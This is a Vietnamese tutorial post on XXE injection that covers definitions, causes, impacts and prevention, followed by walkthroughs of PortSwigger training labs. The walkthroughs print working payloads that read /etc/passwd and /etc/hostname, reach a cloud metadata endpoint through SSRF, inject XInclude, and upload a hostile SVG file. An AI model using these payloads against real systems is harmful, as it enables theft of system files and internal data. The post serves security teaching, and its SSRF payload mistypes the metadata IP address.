XXE (XML external entity) injection là một lỗ hổng đã có từ lâu đời và luôn được đánh giá ở mức độ nghiêm trọng.
Hôm nay chúng ta sẽ đến với tìm hiểu sơ bộ về lỗi và demo khai thác cũng như phân tích demo.

### 1.Định nghĩa
a. XML là gì?

   XML được hiểu đơn giản là ngôn ngữ đánh dấu mở rộng. Đây là 1 công cụ được phát triển để lưu trữ và vận chuyển dữ liệu. Nó dùng để cấu trúc, lưu trữ và trong trao đổi dữ liệu giữa các ứng dụng và lưu trữ dữ liệu. 

   Ví dụ về XML:
   ```
   <?xml version="1.0" encoding="UTF-8"?>
     <laptop>
         <title>Macbook</title>
         <company>Apple</company>
         <year>2020</year>
         <price>30000000</price>
     </laptop>
   ```

b. Entity là gì?

Các thực thể là 1 tính năng của định nghĩa loại tài liệu (DTD) được xác định bằng câu lệnh ENTITY. Các thực thể giúp ta xác định cấu trúc và sử dụng các phím tắt về cú pháp cũng như tham chiếu đến các cú pháp đó trong XML. Thực thể có thể ở ngoài hoặc ở trong. External entity là 1 thực thể tham chiếu đến nội dung ngoài tài liệu XXE.

Entity có thể được khai báo như sau:
```html

<!ENTITY entity-name “entity-value” >

Hoặc:

<!ENTITY entity-name SYSTEM "URI/URL">

```

=> XXE (XML external entity) hay tấn công thực thể bên ngoài XML là lỗ hổng lợi dụng tính năng phân tích cú pháp của XML dùng để phân tích cú pháp đầu vào XML từ người dùng. Từ đó kẻ tấn công có thể truy cập đến các tệp cục bộ, chạy các lệnh, quét các dịch vụ và các   cổng nội bộ, truy cập mạng nội bộ, từ đó có thể thực hiện 1 cuộc tấn công DOS đến máy chủ dễ bị khai thác
### 2. Nguyên nhân
Về bản chất, lỗi XXE phát sinh do bên trong XML có chứa các tính năng nguy hiểm và XML cho phép sử dụng các công cụ phân tích các tính năng này. 
### 3. Các loại tấn công XXE
- Khai thác XXE để lấy dữ liệu tập tin
- Khai thác XXE để thực hiện tấn công SSRF
- Khai thác blind XXE lọc dữ liệu ngoài băng
- Khai thác blind XXE thông qua các thông báo lỗi
### 4. Hậu quả
Kẻ tấn công có thể lấy được dữ liệu của hệ thống, ngoài ra kẻ tấn công còn có thể truy cập được tới các  ứng dụng và các thiết bị phụ trợ mà ứng dụng này được phép truy cập.
Trong một số tình huống, kẻ tấn công có thể leo thang một cuộc tấn công XXE để xâm phạm các dữ liệu nhạy cảm của server hoặc cơ sở hạ tầng back-end khác, bằng cách tận dụng lỗ hổng XXE để thực hiện các cuộc tấn công giả mạo yêu cầu phía máy chủ.
### 5. Cách phòng chống
- Hầu như tất cả các lỗ hổng XXE đều phát sinh do thư viện phân tích cú pháp XML của ứng dụng hỗ trợ các tính năng XML tiềm ẩn nguy hiểm. Cách dễ nhất và hiệu quả nhất để ngăn chặn các cuộc tấn công XXE là vô hiệu hóa các tính năng đó nếu không cần thiết.
- Sử dụng các định dạng dữ liệu ít phức tạp hơn bất cứ khi nào có thể, như JSON và tránh tuần tự hóa dữ liệu nhạy cảm.
- Tập trung vào việc triển khai xác thực, khử trùng hoặc lọc đầu vào phía máy chủ trong whitelist hoặc tích cực để ngăn chặn dữ liệu thù địch trong các tiêu đề, tài liệu hoặc nút XML. 
- Và quan trọng nhất là luôn luôn update các bản vá XML.
### 6. Demo
Phần demo này ta sẽ khai thác trên trang [portswigger](https://portswigger.net). Đây là 1 trang web rất hay để chúng ta có thể học và đồng thời có thể thử khai thác rất nhiều lỗ hổng web thông dụng như: SQLI, XSS, CSRF, XXE, vv... Ta sẽ demo tấn công XXE tại: [Đây](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files) 
#### Khai thác XXE để lấy tập tin
- Nhiệm vụ là lấy được nội dung trong file /etc/passwd.
- Khai thác:

Đây là trang ban đầu
![](https://images.viblo.asia/e980d739-1dd8-4f2c-bba5-4934f82ff6bf.png)

sau 1 hồi kiểm tra thì ta tìm được check stock sử dụng xml: 
![](https://images.viblo.asia/805a940c-2fc9-469c-814e-61d5bbb2c81e.png)

Ta sử dụng burpsuite để khai thác. vào phần XML tại repeater, ứng dụng không thực hiện biện pháp phòng vệ cụ thể nào về XXE, nên ta sẽ lấy dữ liệu trong file `/etc/passwd` gõ thêm vào XML như sau rồi gửi request như sau:
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY pass SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&pass;</productId></stockCheck>
```
Ta được:
![](https://images.viblo.asia/ff1423d8-cf92-452d-a850-87b129a45886.png)

Payload XXE này xác định một thực thể bên ngoài `&pass`. Trọng tải sử dụng giao thức file:// có giá trị là nội dung của tệp /etc/passwd và sử dụng thực thể bên trong là productId . Khi ứng dụng thực hiện phân tích dữ liệu XML với phần DTD như trên, trình phân tích sẽ đọc nội dung tệp /etc/passwd trong hệ thống và gán vào biến `&pass`. Sau đó giá trị của &pass hiển thị thông qua productId.

#### Khai thác XXE để thực hiện tấn công SSRF
Ngoài việc lấy dữ liệu nhạy cảm. XXE thường được dùng để khai thác SSRF. Ta có thể lợi dụng XXE để giả mạo 1 yêu cầu hợp lệ từ hệ thống nội bộ cho phép chúng ta đọc được những dữ liệu bí mật. 
- Nhiệm vụ là truy xuất đến điểm cuối dữ liệu từ 1  url mặc định: http://169.254.169.254/
- Khai thác:

Tương tự ta tìm thấy check stock sử dụng XML:
![](https://images.viblo.asia/d9a77ed9-58fb-4644-a838-99538f26fbcc.png)

Sử dụng burpsuite để tiến hành tấn công XXE, ta gõ lệnh sau:
![](https://images.viblo.asia/d5a8492a-7eb2-47c1-a4f9-cd1e5006c958.png)
Tương tự thì trọng tải này cũng xác định 1 thực thể là `&flag` và hiển thị thông qua productId. Nếu không hiển thị ra được thì chúng ta sẽ cần đến kỹ thuật sử dụng XXE để khai thác SSRF mù.  Ta truyền vào 1 giá trị là `http://169.254.169.254/`. Request sẽ có dạng như sau:
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE slove [ <!ENTITY flag SYSTEM "http://168.254.169.254/"> ]>
<stockCheck><productId>&flag;</productId></stockCheck>
```
Dữ liệu trả về cho ta là latest, đây là tên file thư mục tiếp theo, ta thêm nó vào cuối url payload. Lặp lại đến khi truy xuất được vào file:
![](https://images.viblo.asia/22657cc7-564c-4f9c-bea7-cccc86f4058b.png)

Như vậy là thành công, ta có thể sử dụng dữ liệu để tấn công SSRF.
#### Tấn công Xinclude
 XInclude là một lỗ hổng tiềm ẩn khi nhận XML từ các nguồn không đáng tin cậy. Ta có thể lợi dụng điều này để khai thác XXE.
- Nhiệm vụ là tiêm 1 câu Xinclude để lấy dữ liệu trong file /etc/passwd
- Khai thác: 

Ta vẫn sử dụng burp suite để tấn công. tuy nhiên lần này ta không thấy được hết toàn bộ XML:
![](https://images.viblo.asia/f56e78a9-3933-41b4-a26f-e4fc78691563.png)

Nên ta sẽ sử dụng XInclude từ 1 url bên ngoài để truy xuất file /etc/passwd. Khi sử dụng XInclude thì mặc định ta sẽ không truy xuất được đến /etc/passwd do XInclude là phân tích gói. Vì vậy để truy xuất thành công ta thêm 1 thuộc tính parse=”text” vào trong:
```html
productId=<foo xmlns:link="http://www.w3.org/2001/XInclude">
<link:include parse="text" href="file:///etc/passwd"/></foo>&StoreId=3
```
![](https://images.viblo.asia/e261d4a1-e1da-463e-913b-32d1083094de.png)

trong đó xmlns là 1 XML namespaces cung cấp url là 1 địa chỉ chứa file Xinclude XML
 #### Khai thác XXE thông qua tải tập tin:
 - Nhiệm vụ là ta cần upload 1 file ảnh trong phần comment để lấy hostname
 - Khai thác:
Vào phần comment ta có:
![](https://images.viblo.asia/7f743a49-e115-4922-b1bb-7b0c12be01df.png)

Ta cần tạo 1 file ảnh đuôi .svg và có nội dung bên trong là 1 file XML để lấy nội dung file /etc/hostname. Phần chính khá giống với lấy file từ trong XML: 

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE slove [ <!ENTITY flag SYSTEM "file:///etc/hostname">] >
```

Tuy nhiên ta cần thêm 1 vài thẻ và thuộc tính để thành định dạng hình ảnh. Phần file ảnh có dạng như sau:
```html
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE slove [ <!ENTITY flag SYSTEM "file:///etc/hostname">] >
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&flag</text></svg>
```
![](https://images.viblo.asia/8a02bf8b-51ed-482e-95d0-c9ca1d8b95e0.png)

Trong đó 

```
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
```

là 2 link dẫn đến file svg và xlink của XML, cho phép ta tạo liên kết giữa XML và SVG. Phần text là phần hiển thị kết quả ra ngoài. 

Upload file lên sau đó vào phần comment sẽ thấy comment của mình có hình ảnh, tại đó sẽ chứa hostname:
![](https://images.viblo.asa/83c17acb-a2a2-4a35-a0ee-695356051a65.png)

Tải ảnh về ta lấy được hostname:
![](https://images.viblo.asia/9eaae012-4fcf-4f1c-b6c5-58117d184c0c.png)